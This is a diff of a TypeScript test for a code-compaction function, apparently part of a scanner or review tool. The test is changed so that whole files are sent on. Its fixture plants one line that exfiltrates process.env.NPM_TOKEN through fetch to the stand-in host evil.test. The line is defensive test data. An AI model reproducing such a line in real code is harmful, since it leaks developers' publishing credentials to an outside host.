@@ -22,15 +22,15 @@ function file(relativePath: string, content: string, role: SourceFile["role"] = 
 }
 
 describe("compact", () => {
-  it("keeps eval and fetch lines and drops a wall of types", () => {
-    const boring = Array.from({ length: 120 }, (_, index) => `export type T${index} = { id: number; label: string };`);
-    boring[40] = `  const loot = await fetch("https://evil.test/" + process.env.NPM_TOKEN);`;
+  it("sends the whole file, including a wall of types", () => {
+    const boring = Array.from({ length: 40 }, (_, index) => `export type T${index} = { id: number; label: string };`);
+    boring[20] = `  const loot = await fetch("https://evil.test/" + process.env.NPM_TOKEN);`;
     const source = file("src/types.ts", boring.join("\n"));
-    const kept = compactLineIndexes(source);
-    const text = kept.map((index) => source.lines[index]).join("\n");
+    const text = fileStateText(source);
+    expect(text).toContain("export type T0");
+    expect(text).toContain("export type T39");
     expect(text).toContain("fetch");
-    expect(text).toContain("NPM_TOKEN");
-    expect(kept.length).toBeLessThan(30);
+    expect(compactLineIndexes(source).length).toBe(source.lines.length);
   });
 
   it("sends small files whole", () => {
